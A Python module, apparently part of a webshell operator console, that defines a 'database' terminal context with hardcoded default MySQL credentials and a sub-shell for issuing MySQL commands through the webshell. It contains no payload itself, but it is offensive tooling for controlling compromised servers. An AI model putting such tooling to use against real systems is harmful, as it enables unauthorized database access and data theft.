"""
 Author: Ido
 Date: 22/09/21
 Purpose: Be the database context
"""

import cmd2
from webshell_master_cmd import WebshellCmd
from snippets.snippet_handler import get_snippet
from communication import send_snippet

from db_context.mysql_terminal import MySQLTerminal

class DatabaseTerminal(WebshellCmd):
    """
    Be shell context for the webshell, run shell commands, putfile and getfile
    """

    def __init__(self):
        super(WebshellCmd, self).__init__()
        self.prompt = "database> "

        self.host = "localhost"
        self.username = "toor"
        self.password = "12345"
        self.database = "test"
        self.port = "3306"

    def do_auth(self, statement: cmd2.Statement):
        print("Your current authentication is: ")
        print(f"\n\t{self.host}\n\t{self.port}\n\t{self.username}\n\t{self.password}\n\t{self.database}")

    def do_mysql(self, statement: cmd2.Statement):
        mysql_terminal = MySQLTerminal()
        mysql_terminal.cmdloop()
